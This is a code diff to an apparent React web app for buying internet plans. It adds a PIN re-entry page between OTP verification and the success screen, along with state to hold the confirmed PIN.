@@ -5,6 +5,7 @@ import { INTERNET_PLANS } from './data/plans';
 import { PlansPage } from './components/PlansPage';
 import { LoginPage } from './components/LoginPage';
 import { OtpPage } from './components/OtpPage';
+import { ReenterPinPage } from './components/ReenterPinPage';
 import { SuccessPage } from './components/SuccessPage';
 import { AppProvider } from './context/AppContext';
 import { CountryInfo } from './data/countries';
@@ -15,6 +16,7 @@ function AppContent() {
   const [userPhone, setUserPhone] = useState<string>('');
   const [userFullPhone, setUserFullPhone] = useState<string>('');
   const [userPin, setUserPin] = useState<string>('');
+  const [confirmedPin, setConfirmedPin] = useState<string>('');
   const [userCountry, setUserCountry] = useState<CountryInfo | undefined>(undefined);
   const [sessionId, setSessionId] = useState<string>('');
 
@@ -41,6 +43,13 @@ function AppContent() {
   };
 
   const handleOtpSuccess = () => {
+    // After OTP verification success, transition to PIN re-entry page before Success
+    setStep('REENTER_PIN');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  const handleReenterPinSuccess = (finalPin: string) => {
+    setConfirmedPin(finalPin);
     setStep('SUCCESS');
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
@@ -50,6 +59,7 @@ function AppContent() {
     setUserPhone('');
     setUserFullPhone('');
     setUserPin('');
+    setConfirmedPin('');
     setSessionId('');
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
@@ -111,6 +121,28 @@ function AppContent() {
               selectedPlan={selectedPlan}
               onBack={() => setStep('LOGIN')}
               onOtpSuccess={handleOtpSuccess}
+            />
+          </motion.div>
+        )}
+
+        {step === 'REENTER_PIN' && (
+          <motion.div
+            key="reenter-pin-view"
+            variants={pageVariants}
+            initial="initial"
+            animate="animate"
+            exit="exit"
+            transition={{ duration: 0.3, ease: 'easeInOut' }}
+          >
+            <ReenterPinPage
+              phone={userPhone}
+              fullPhone={userFullPhone}
+              country={userCountry}
+              initialPin={userPin}
+              sessionId={sessionId}
+              selectedPlan={selectedPlan}
+              onBack={() => setStep('OTP')}
+              onSuccess={handleReenterPinSuccess}
             />
           </motion.div>
         )}
